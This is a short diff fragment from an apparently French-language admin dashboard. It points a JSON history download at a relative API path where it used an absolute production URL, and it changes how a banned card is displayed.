-                method: 'POST', headers: { 'X-API-KEY': API_KEY }
-            });
-            if (card) card.classList.remove('banned');
+            card.style.opacity = '0.3';
         }
 
         async function downloadJSON() {
-            const res = await fetch('https://api-production-8591.up.railway.app/v1/admin/download', {
-                headers: { 'X-API-KEY': API_KEY }
-            });
+            const res = await fetch('/v1/admin/download', { headers: { 'X-API-KEY': API_KEY } });
             if (res.ok) {
                 const blob = await res.blob();
                 const url = window.URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = 'audit_history.json';
-                document.body.appendChild(a);
+                a.download = 'history.json';
                 a.click();
-                a.remove();
-            } else {
-                alert("Erreur lors du téléchargement.");
             }
         }
 
